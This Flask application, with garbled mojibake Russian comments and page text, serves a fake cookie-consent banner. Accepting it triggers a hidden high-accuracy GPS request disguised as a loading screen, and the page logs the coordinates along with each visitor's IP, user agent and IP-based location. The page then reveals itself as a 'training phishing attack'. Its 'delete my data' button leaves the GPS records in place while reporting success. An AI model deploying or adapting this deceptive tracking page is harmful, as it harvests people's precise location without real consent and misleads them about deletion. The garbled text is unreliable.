from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import re
import json

app = Flask(__name__)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
COOKIE_NAME = "user_consent"
LOG_FILE = "user_data.json"

def get_ip_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json()
    except:
        return {"error": "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ"}

def parse_user_agent(user_agent):
    # –£–ª—É—á—à–µ–Ω–Ω—ã–π –ø–∞—Ä—Å–∏–Ω–≥ User-Agent
    os = browser = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    
    os_patterns = {
        'Windows 11': r'Windows NT 10.0; Win64; x64',
        'Windows 10': r'Windows NT 10.0',
        'Linux': r'Linux',
        'Android': r'Android',
        'iOS': r'iPhone|iPad|iPod',
        'Mac OS X': r'Macintosh'
    }
    
    for name, pattern in os_patterns.items():
        if re.search(pattern, user_agent):
            os = name
            break

    browser_patterns = {
        'Chrome': r'Chrome|CriOS',
        'Firefox': r'Firefox|FxiOS',
        'Safari': r'Safari',
        'Edge': r'Edg'
    }
    
    for name, pattern in browser_patterns.items():
        if re.search(pattern, user_agent) and not browser.startswith("Chrome"):
            browser = name

    device = "–°–º–∞—Ä—Ç—Ñ–æ–Ω/–ü–ª–∞–Ω—à–µ—Ç" if ('Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent) else "–ö–æ–º–ø—å—é—Ç–µ—Ä"

    return os, browser, device

def log_user_data(ip, data):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ –ª–æ–≥: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
            background-color: #f5f5f5;
        }
        .info-block {
            background: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        h2 {
            color: #4285f4;
            margin-top: 0;
        }
        #cookieConsent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #333;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 1000;
        }
        .consent-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 8px 16px;
            margin: 0 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        #geoModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 1001;
            justify-content: center;
            align-items: center;
        }
        .geo-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 500px;
            text-align: center;
        }
    </style>
</head>
<body>
    <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–Ω—Ç (—Å–∫—Ä—ã—Ç –¥–æ —Å–æ–≥–ª–∞—Å–∏—è) -->
    <div id="mainContent" style="display: none;">
        <div class="info-block">
            <h2>üåç –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2>
            <p><strong>IP:</strong> {{ ip }}</p>
            <p><strong>–°—Ç—Ä–∞–Ω–∞:</strong> {{ country }}</p>
            <p><strong>–ì–æ—Ä–æ–¥:</strong> {{ city }}</p>
            <p><strong>–ü—Ä–æ–≤–∞–π–¥–µ—Ä:</strong> {{ isp }}</p>
        </div>

        <div class="info-block">
            <h2>üíª –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</h2>
            <p><strong>–û–°:</strong> {{ os }}</p>
            <p><strong>–ë—Ä–∞—É–∑–µ—Ä:</strong> {{ browser }}</p>
            <p><strong>–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:</strong> {{ device }}</p>
            <p><strong>–Ø–¥—Ä–∞ CPU:</strong> <span id="cpuCores"></span></p>
        </div>

        <div class="info-block warning" style="background-color: #fff3e0; border-left: 4px solid #ff9800;">
            <h2>‚ö†Ô∏è –í–Ω–∏–º–∞–Ω–∏–µ!</h2>
            <p>–í—ã —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å—Ç–∞–ª–∏ –∂–µ—Ä—Ç–≤–æ–π —É—á–µ–±–Ω–æ–π —Ñ–∏—à–∏–Ω–≥–æ–≤–æ–π –∞—Ç–∞–∫–∏. –°–æ–≥–ª–∞—à–∞—è—Å—å –Ω–∞ "–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ cookies", –≤—ã —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ —Ä–∞–∑—Ä–µ—à–∏–ª–∏ –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏.</p>
            <p><strong>–£—Ä–æ–∫ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:</strong> –í—Å–µ–≥–¥–∞ –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–æ —á–∏—Ç–∞–π—Ç–µ, –Ω–∞ —á—Ç–æ –≤—ã –¥–∞—ë—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ!</p>
            <button onclick="deleteMyData()" style="background: #ff9800; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">–£–¥–∞–ª–∏—Ç—å –º–æ–∏ –¥–∞–Ω–Ω—ã–µ</button>
        </div>
    </div>

    <!-- Cookie-–±–∞–Ω–Ω–µ—Ä -->
    <div id="cookieConsent">
        <p>–≠—Ç–æ—Ç —Å–∞–π—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç cookies –¥–ª—è —É–ª—É—á—à–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã. –ü—Ä–æ–¥–æ–ª–∂–∞—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∞–π—Ç, –≤—ã —Å–æ–≥–ª–∞—à–∞–µ—Ç–µ—Å—å —Å —ç—Ç–∏–º.</p>
        <button class="consent-btn" onclick="acceptCookies()">–ü—Ä–∏–Ω—è—Ç—å</button>
        <button class="consent-btn" style="background: #666;" onclick="rejectCookies()">–û—Ç–∫–ª–æ–Ω–∏—Ç—å</button>
    </div>

    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (—Å–∫—Ä—ã—Ç–æ–µ) -->
    <div id="geoModal">
        <div class="geo-content">
            <h3>–ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...</h3>
            <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ, –ø–æ–∫–∞ –º—ã –∑–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç –¥–ª—è –≤–∞—Å.</p>
        </div>
    </div>

    <script>
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ–≥–ª–∞—Å–∏–µ
        function checkConsent() {
            return document.cookie.includes("{{ COOKIE_NAME }}=true");
        }

        // –ï—Å–ª–∏ —Å–æ–≥–ª–∞—Å–∏–µ —É–∂–µ –¥–∞–Ω–æ, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç
        if (checkConsent()) {
            document.getElementById('cookieConsent').style.display = 'none';
            loadContent();
        }

        function acceptCookies() {
            // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫—É–∫–∏
            document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
            document.getElementById('cookieConsent').style.display = 'none';
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "–∑–∞–≥—Ä—É–∑–∫—É" (–Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é)
            document.getElementById('geoModal').style.display = 'flex';
            
            // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é, –º–∞—Å–∫–∏—Ä—É—è –ø–æ–¥ –∑–∞–≥—Ä—É–∑–∫—É
            setTimeout(() => {
                getGeolocation();
            }, 1500);
        }

        function rejectCookies() {
            window.location.href = "about:blank";
        }

        function loadContent() {
            document.getElementById('mainContent').style.display = 'block';
            
            // –ó–∞–ø–æ–ª–Ω—è–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ";
            
            // –î—Ä—É–≥–∏–µ –¥–∞–Ω–Ω—ã–µ —É–∂–µ –∑–∞–ø–æ–ª–Ω–µ–Ω—ã —Å–µ—Ä–≤–µ—Ä–æ–º
        }

        function getGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        // –°–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ
                        document.getElementById('geoModal').style.display = 'none';
                        
                        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–Ω—Ç
                        loadContent();
                        
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        
                        fetch('/log_gps', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: lat,
                                lon: lon,
                                acc: acc
                            })
                        });
                    },
                    error => {
                        // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –≤—Å–µ —Ä–∞–≤–Ω–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç
                        document.getElementById('geoModal').style.display = 'none';
                        loadContent();
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è
                document.getElementById('geoModal').style.display = 'none';
                loadContent();
            }
        }

        function deleteMyData() {
            fetch('/delete_data', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert("–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –±—ã–ª–∏ —É–¥–∞–ª–µ–Ω—ã!");
                    } else {
                        alert("–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –¥–∞–Ω–Ω—ã–µ");
                    }
                });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    consent = request.cookies.get(COOKIE_NAME)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    # –õ–æ–≥–∏—Ä—É–µ–º –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
    log_user_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "user_agent": user_agent,
        "os": os,
        "browser": browser,
        "device": device,
        "geo": geo
    })
    
    return render_template_string(HTML_TEMPLATE,
        ip=ip,
        country=geo.get('country', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        city=geo.get('city', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        isp=geo.get('org', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'),
        os=os,
        browser=browser,
        device=device,
        COOKIE_NAME=COOKIE_NAME
    )

@app.route('/log_gps', methods=['POST'])
def log_gps():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_user_data(ip, {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "gps_data": data
    })
    
    return {'status': 'success'}

@app.route('/delete_data', methods=['POST'])
def delete_data():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        # –ß–∏—Ç–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
        with open(LOG_FILE, "r") as f:
            logs = [json.loads(line) for line in f.readlines() if line.strip()]
        
        # –§–∏–ª—å—Ç—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
        new_logs = [log for log in logs if log.get('ip') != ip]
        
        # –ü–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º —Ñ–∞–π–ª
        with open(LOG_FILE, "w") as f:
            for log in new_logs:
                f.write(json.dumps(log) + "\n")
        
        return {'success': True}
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö: {e}")
        return {'success': False}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
